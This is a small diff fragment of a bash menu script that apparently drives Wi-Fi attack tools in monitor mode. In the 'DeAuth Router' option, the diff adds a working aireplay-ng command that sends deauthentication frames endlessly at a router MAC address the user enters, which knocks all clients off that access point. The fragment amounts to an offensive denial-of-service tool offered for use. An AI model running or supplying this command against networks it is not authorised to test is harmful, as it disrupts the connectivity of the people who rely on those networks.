@@ -35,7 +35,7 @@ while true; do
         4)  # DeAuth Router
             read -p "Enter channel: " channel
             read -p "Enter router MAC adress: " router_mac
-            sudo airodump-ng 
+            aireplay-ng --deauth 0 -a $router_mac wlp1s0mon
             ;;
         5)  # Exit
             sudo airmon-ng stop wlp1s0mon
